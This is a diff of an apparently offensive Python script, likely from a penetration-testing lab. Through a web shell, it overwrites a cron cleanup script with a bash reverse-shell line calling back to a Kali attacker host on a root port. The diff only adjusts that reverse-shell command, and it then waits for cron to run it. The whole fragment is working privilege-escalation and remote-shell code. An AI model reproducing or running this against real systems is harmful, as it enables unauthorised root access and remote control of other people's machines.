@@ -53,7 +53,7 @@ def run(www_shell, kali_host=KALI_HOST, cron_script=CLEANUP_SCRIPT):
         # `>` truncates, `>>` appends.
         log(f"[*] Overwriting {cron_script}...")
         send_command(www_shell, f"echo '#!/bin/bash' > {cron_script}")
-        send_command(www_shell, f"echo 'bash -i >& /dev/tcp/{kali_host}/{PORT_ROOT} 0>&1' >> {cron_script}")
+        send_command(www_shell, f"echo 'bash -i > /dev/tcp/{kali_host}/{PORT_ROOT} 2>/dev/null 0>&1' >> {cron_script}")
         log(f"[+] {cron_script} overwritten successfully")
         log("[*] Waiting for cron job (max. 60 seconds)...")
 
